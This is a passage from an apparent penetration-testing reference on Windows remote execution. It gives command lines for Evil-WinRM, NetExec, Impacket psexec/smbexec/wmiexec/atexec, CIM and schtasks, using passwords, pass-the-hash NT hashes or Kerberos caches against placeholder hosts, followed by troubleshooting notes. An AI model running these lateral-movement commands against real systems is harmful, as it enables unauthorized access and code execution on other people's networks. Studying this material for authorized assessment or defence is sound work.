+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">evil-winrm</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -i</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -u</span><span style="color:#A5D6FF"> 'CORP\analyst'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -H</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">NTHAS</span><span style="color:#E6EDF3">H</span><span style="color:#FF7B72">></span></span></code></pre>
+<p>Kerberos:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">evil-winrm</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -i</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -r</span><span style="color:#A5D6FF"> CORP.LOCAL</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -K</span><span style="color:#A5D6FF"> ./analyst.ccache</span></span></code></pre>
+<p>For Kerberos, use the FQDN associated with the expected SPN.</p>
+<h3 id="netexec">NetExec</h3>
+<p>Password:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">nxc</span><span style="color:#A5D6FF"> winrm</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -u</span><span style="color:#A5D6FF"> analyst</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -d</span><span style="color:#A5D6FF"> CORP.LOCAL</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -p</span><span style="color:#A5D6FF"> '&#x3C;PASSWORD>'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -x</span><span style="color:#A5D6FF"> 'whoami'</span></span></code></pre>
+<p>NT hash:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">nxc</span><span style="color:#A5D6FF"> winrm</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -u</span><span style="color:#A5D6FF"> analyst</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -d</span><span style="color:#A5D6FF"> CORP.LOCAL</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -H</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">NTHAS</span><span style="color:#E6EDF3">H</span><span style="color:#FF7B72">></span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -x</span><span style="color:#A5D6FF"> 'whoami'</span></span></code></pre>
+<p>PowerShell:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">nxc</span><span style="color:#A5D6FF"> winrm</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -u</span><span style="color:#A5D6FF"> analyst</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -d</span><span style="color:#A5D6FF"> CORP.LOCAL</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -H</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">NTHAS</span><span style="color:#E6EDF3">H</span><span style="color:#FF7B72">></span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -X</span><span style="color:#A5D6FF"> '$env:COMPUTERNAME'</span></span></code></pre>
+<p>The generic NetExec CLI exposes Kerberos options, but the current WinRM implementation uses NTLM. For Kerberos, use PowerShell Remoting, Evil-WinRM, or another client that implements that path.</p>
+<h3 id="client-certificate">Client certificate</h3>
+<p>Evil-WinRM accepts a certificate and private key:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">evil-winrm</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -i</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -S</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -P</span><span style="color:#79C0FF"> 5986</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -c</span><span style="color:#A5D6FF"> ./client.pem</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -k</span><span style="color:#A5D6FF"> ./client.key</span></span></code></pre>
+<p>It only works when WinRM certificate authentication is configured and the certificate matches a valid <code>CertMapping</code> to a local account.</p>
+<h3 id="second-hop">Second hop</h3>
+<p>A session can work:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>operator → win01</span></span></code></pre>
+<p>and then fail when it attempts:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>win01 → fileserver</span></span></code></pre>
+<p>as the original identity.</p>
+<p>This is the PowerShell Remoting second-hop problem. CredSSP is one delegation option, but environments can also use Kerberos delegation or explicit credentials for the second resource.</p>
+<p>For lookup, the important distinction is:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>WinRM to host A works</span></span>
+<span class="line"><span>        ≠</span></span>
+<span class="line"><span>host A can authenticate to host B as the same user</span></span></code></pre>
+<h2 id="smb-and-service-control-manager">SMB and Service Control Manager</h2>
+<p>SMB authentication and SCM-backed execution are separate capabilities. An account can enumerate shares and still fail to open the Service Control Manager or create a service.</p>
+<h3 id="psexec">PsExec</h3>
+<div class="pub-tabs"><section class="pub-tab" data-tab-label="Sysinternals"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">PsExec.exe \\win01.corp.local -accepteula -u CORP\analyst cmd.exe</span></span></code></pre></section><section class="pub-tab" data-tab-label="Impacket"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-psexec</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span></span></code></pre></section></div>
+<p>With an NT hash:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-psexec</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -hashes</span><span style="color:#A5D6FF"> ':&#x3C;NTHASH>'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span></span></code></pre>
+<p>With Kerberos:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E6EDF3">KRB5CCNAME</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$PWD</span><span style="color:#A5D6FF">/analyst.ccache"</span><span style="color:#FFA657"> \</span></span>
+<span class="line"><span style="color:#E6EDF3">impacket-psexec </span><span style="color:#FF7B72">\</span></span>
+<span class="line"><span style="color:#79C0FF">  -k</span><span style="color:#79C0FF"> -no-pass</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span></span></code></pre>
+<p>The Impacket implementation accesses SCM through <code>\pipe\svcctl</code>, installs <code>RemComSvc</code>, and uses additional named pipes for stdin/stdout/stderr.</p>
+<h3 id="smbexec">SMBExec</h3>
+<p>Password:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-smbexec</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span></span></code></pre>
+<p>NT hash:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-smbexec</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -hashes</span><span style="color:#A5D6FF"> ':&#x3C;NTHASH>'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span></span></code></pre>
+<p>Kerberos:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E6EDF3">KRB5CCNAME</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$PWD</span><span style="color:#A5D6FF">/analyst.ccache"</span><span style="color:#FFA657"> \</span></span>
+<span class="line"><span style="color:#E6EDF3">impacket-smbexec </span><span style="color:#FF7B72">\</span></span>
+<span class="line"><span style="color:#79C0FF">  -k</span><span style="color:#79C0FF"> -no-pass</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span></span></code></pre>
+<p>SMBExec also uses SCM, but it creates a service whose command line runs the requested command and redirects output. It does not use the same payload model as <code>psexec</code>.</p>
+<h3 id="netexec-1">NetExec</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">nxc</span><span style="color:#A5D6FF"> smb</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -u</span><span style="color:#A5D6FF"> analyst</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -d</span><span style="color:#A5D6FF"> CORP.LOCAL</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -H</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">NTHAS</span><span style="color:#E6EDF3">H</span><span style="color:#FF7B72">></span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -x</span><span style="color:#A5D6FF"> 'whoami'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  --exec-method</span><span style="color:#A5D6FF"> smbexec</span></span></code></pre>
+<p>Current SMB execution methods include:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>wmiexec</span></span>
+<span class="line"><span>mmcexec</span></span>
+<span class="line"><span>smbexec</span></span>
+<span class="line"><span>atexec</span></span></code></pre>
+<p>Selecting <code>wmiexec</code> or <code>atexec</code> from <code>nxc smb</code> can introduce dependencies on other RPC interfaces. Starting the operation from NetExec’s SMB module does not turn all of those methods into purely SMB execution.</p>
+<h2 id="wmi-and-cim">WMI and CIM</h2>
+<p>WMI remains a supported technology and a useful remote-execution primitive. What Microsoft removed from current Windows releases is the <code>wmic.exe</code> utility, not the WMI infrastructure.</p>
+<h3 id="impacket-wmiexec">Impacket WMIExec</h3>
+<p>Password:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-wmiexec</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'whoami'</span></span></code></pre>
+<p>NT hash:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-wmiexec</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -hashes</span><span style="color:#A5D6FF"> ':&#x3C;NTHASH>'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'whoami'</span></span></code></pre>
+<p>Kerberos:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E6EDF3">KRB5CCNAME</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$PWD</span><span style="color:#A5D6FF">/analyst.ccache"</span><span style="color:#FFA657"> \</span></span>
+<span class="line"><span style="color:#E6EDF3">impacket-wmiexec </span><span style="color:#FF7B72">\</span></span>
+<span class="line"><span style="color:#79C0FF">  -k</span><span style="color:#79C0FF"> -no-pass</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'whoami'</span></span></code></pre>
+<p><code>impacket-wmiexec</code> uses WMI over DCOM and <code>Win32_Process.Create</code>. It normally requires TCP/135, dynamic RPC ports, and SMB to retrieve output from an administrative share.</p>
+<p>Without stdout retrieval:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-wmiexec</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -nooutput</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'cmd.exe /c &#x3C;COMMAND>'</span></span></code></pre>
+<p>The remote process runs in the authenticated user’s context, rather than the <code>SYSTEM</code> context commonly obtained through service execution.</p>
+<h3 id="netexec-wmi">NetExec WMI</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">nxc</span><span style="color:#A5D6FF"> wmi</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -u</span><span style="color:#A5D6FF"> analyst</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -d</span><span style="color:#A5D6FF"> CORP.LOCAL</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -H</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">NTHAS</span><span style="color:#E6EDF3">H</span><span style="color:#FF7B72">></span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -x</span><span style="color:#A5D6FF"> 'whoami'</span></span></code></pre>
+<p>The current <code>wmiexec</code> implementation in NetExec’s WMI module retrieves results through the registry instead of depending on the SMB output channel used by <code>impacket-wmiexec</code>.</p>
+<h3 id="cim-over-ws-man">CIM over WS-Man</h3>
+<p>CIM cmdlets are the current PowerShell interface for CIM/WMI providers. <code>New-CimSession</code> uses WS-Man by default:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">$cred </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> Get-Credential</span><span style="color:#A5D6FF"> 'CORP\analyst'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$cim </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-CimSession</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">ComputerName win01.corp.local </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Credential $cred</span></span></code></pre>
+<p>Execute through <code>Win32_Process.Create</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Invoke-CimMethod</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">CimSession $cim </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">ClassName Win32_Process </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">MethodName Create </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Arguments </span><span style="color:#FF7B72">@</span><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#E6EDF3">    CommandLine </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> 'cmd.exe /c whoami > C:\Windows\Temp\whoami.txt'</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Remove-CimSession</span><span style="color:#E6EDF3"> $cim</span></span></code></pre>
+<p>The call starts a non-interactive process and returns process-creation information; it does not provide a shell or stdout.</p>
+<h3 id="cim-over-dcom">CIM over DCOM</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">$options </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-CimSessionOption</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">Protocol Dcom</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$cim </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-CimSession</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">ComputerName win01.corp.local </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Credential $cred </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">SessionOption $options</span></span></code></pre>
+<p>The same CIM interface can therefore use WS-Man or DCOM. <code>CIM</code> should not be treated as a separate network protocol.</p>
+<h3 id="legacy-wmic">Legacy WMIC</h3>
+<p>On systems where <code>wmic.exe</code> still exists, it remains a usable interface:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">where</span><span style="color:#FF7B72"> wmic</span></span></code></pre>
+<p>Its removal from current Windows releases affects availability, not the offensive usefulness of the binary when encountered or the existence of WMI itself.</p>
+<h2 id="scheduled-tasks">Scheduled Tasks</h2>
+<h3 id="impacket-atexec">Impacket atexec</h3>
+<p>Password:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-atexec</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'whoami'</span></span></code></pre>
+<p>NT hash:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-atexec</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -hashes</span><span style="color:#A5D6FF"> ':&#x3C;NTHASH>'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'whoami'</span></span></code></pre>
+<p>Kerberos:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E6EDF3">KRB5CCNAME</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$PWD</span><span style="color:#A5D6FF">/analyst.ccache"</span><span style="color:#FFA657"> \</span></span>
+<span class="line"><span style="color:#E6EDF3">impacket-atexec </span><span style="color:#FF7B72">\</span></span>
+<span class="line"><span style="color:#79C0FF">  -k</span><span style="color:#79C0FF"> -no-pass</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'whoami'</span></span></code></pre>
+<p>The current implementation uses Task Scheduler RPC over <code>\pipe\atsvc</code>, registers a temporary task as <code>LocalSystem</code>, runs it, removes the task, and retrieves output from <code>ADMIN$\Temp</code>.</p>
+<h3 id="schtasks">schtasks</h3>
+<p>Create:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">schtasks</span><span style="color:#E6EDF3"> /Create </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /S win01.corp.local </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /TN DfulAssessmentOnce </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /SC ONCE </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /ST </span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">HH:MM</span><span style="color:#FF7B72">></span><span style="color:#FF7B72"> ^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /TR </span><span style="color:#A5D6FF">"cmd.exe /c whoami > C:\Windows\Temp\dful-whoami.txt"</span><span style="color:#FF7B72"> ^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /F</span></span></code></pre>
+<p>Run:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">schtasks</span><span style="color:#E6EDF3"> /Run </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /S win01.corp.local </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /TN DfulAssessmentOnce</span></span></code></pre>
+<p>Delete:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">schtasks</span><span style="color:#E6EDF3"> /Delete </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /S win01.corp.local </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /TN DfulAssessmentOnce </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /F</span></span></code></pre>
+<p><code>atexec</code> and <code>schtasks</code> consume the same broad Task Scheduler capability, but not every client should be assumed to use Impacket’s exact transport or output-retrieval mechanism.</p>
+<h2 id="troubleshooting">Troubleshooting</h2>
+<h3 id="authentication-and-authorization">Authentication and authorization</h3>
+<p>Separate the path into layers:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>network</span></span>
+<span class="line"><span> ↓</span></span>
+<span class="line"><span>service / transport</span></span>
+<span class="line"><span> ↓</span></span>
+<span class="line"><span>authentication</span></span>
+<span class="line"><span> ↓</span></span>
+<span class="line"><span>authorization</span></span>
+<span class="line"><span> ↓</span></span>
+<span class="line"><span>execution / session</span></span>
+<span class="line"><span> ↓</span></span>
+<span class="line"><span>output retrieval</span></span></code></pre>
+<p>Common examples:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>445 reachable</span></span>
+<span class="line"><span>+ SMB authenticates</span></span>
+<span class="line"><span>+ shares are visible</span></span>
+<span class="line"><span>- SCM returns ACCESS_DENIED</span></span></code></pre>
+<p>The credential is valid for SMB; the authorization needed by PsExec/SMBExec is missing.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>5985 reachable</span></span>
+<span class="line"><span>+ WinRM authenticates</span></span>
+<span class="line"><span>- endpoint denies Invoke/session</span></span></code></pre>
+<p>The listener and credential work; endpoint authorization is failing.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>WMI executes</span></span>
+<span class="line"><span>- wmiexec returns no stdout</span></span></code></pre>
+<p>DCOM execution can work while the SMB output channel fails.</p>
+<h3 id="kerberos-1">Kerberos</h3>
+<p>If Kerberos works with one tool and fails with another, first compare the requested service:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>cifs/win01.corp.local</span></span>
+<span class="line"><span>HTTP/win01.corp.local</span></span></code></pre>
+<p>Inspect the cache:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">klist</span></span></code></pre>
+<p>Request a specific SPN:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">kvno</span><span style="color:#A5D6FF"> cifs/win01.corp.local</span></span></code></pre>
+<p>Common shared causes include DNS, an incorrect FQDN/SPN, the wrong KDC, expired tickets, and clock skew.</p>
+<h3 id="switching-mechanisms">Switching mechanisms</h3>
+<p>The same identity can:</p>
+<ul>
+<li>Authenticate over SMB and fail SCM.</li>
+<li>Execute through SCM and fail WMI.</li>
+<li>Execute through WMI and fail Task Scheduler.</li>
+<li>Authenticate to WinRM and fail to open a PSRP endpoint.</li>
+<li>Have normal RDP logon rights and still fail Restricted Admin requirements.</li>
+<li>Be a local administrator and receive a filtered remote token.</li>
+</ul>
+<p>When another reachable interface accepts the same authentication material, switching mechanism is often more useful than treating every <code>ACCESS_DENIED</code> as a credential problem.</p>
+<h2 id="references">References</h2>
+<ul>
+<li>Microsoft — Remote Credential Guard and Restricted Admin.</li>
+<li>Microsoft — PowerShell Remoting and WinRM security.</li>
+<li>Microsoft — WinRM authentication and certificate mapping.</li>
+<li>Microsoft — UAC remote restrictions.</li>
+<li>Microsoft — <code>New-CimSession</code>, <code>New-CimSessionOption</code>, and <code>Invoke-CimMethod</code>.</li>
+<li>Microsoft — <code>Win32_Process.Create</code>.</li>
+<li>Microsoft — <code>winrs</code>.</li>
+<li>Microsoft — WMIC removal and WMI status.</li>
+<li>OpenBSD — current OpenSSH manuals.</li>
+<li>FreeRDP — current client arguments.</li>
+<li>Fortra — Impacket <code>psexec</code>, <code>smbexec</code>, <code>wmiexec</code>, <code>atexec</code>, and <code>getTGT</code>.</li>
+<li>Hackplayers — Evil-WinRM.</li>
+<li>NetExec — current SMB, WinRM, and WMI implementations.</li>
